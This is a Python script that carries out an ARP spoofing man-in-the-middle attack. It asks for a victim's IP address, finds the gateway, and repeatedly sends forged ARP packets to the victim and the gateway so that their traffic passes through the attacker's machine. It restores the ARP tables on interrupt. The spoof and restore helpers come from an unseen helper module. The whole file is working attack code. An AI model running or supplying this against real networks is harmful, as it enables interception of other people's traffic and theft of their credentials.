import time
from helper import *

victim_ip = input("Enter victim's IP address: ")

def spoofing(victim_ip, output = False):
    """
    Performs the ARP spoofing attack
    The function should be executed during the attack,
    otherwise ARP table of the victim will be updated to its 
    correct state.

    Step 1: Spoofing victim
    Step 2: Spoofing gateway
    Note: We maintain the number of packets sent in packets_count
    Step 3: Waiting for 'sleep' seconds before sending next packets

    ARP tables will be restored to their correct state on KeyboardInterrupt

    Step 4: Restoring victim's ARP table
    Step 5: Restoring gateway's ARP table
    """

    sleep = 2
    packets_count = 0
    gateway = scapy.conf.route.route("0.0.0.0")[2]
    
    try:
        while True:
            # Step 1
            spoof(victim_ip, gateway, output)

            # Step 2
            spoof(gateway, victim_ip, output)

            packets_count += 2
            print(f"[+] Packets sent: {packets_count}")

            # Step 3
            time.sleep(sleep)
    except KeyboardInterrupt:
        print("\n Reseting ARP tables. Please wait...")
        
        # Step 4
        restore(victim_ip, gateway, output)

        # Step 5
        restore(gateway, victim_ip, output)

        print("\n ARP tables restored.")
        
spoofing(victim_ip, True)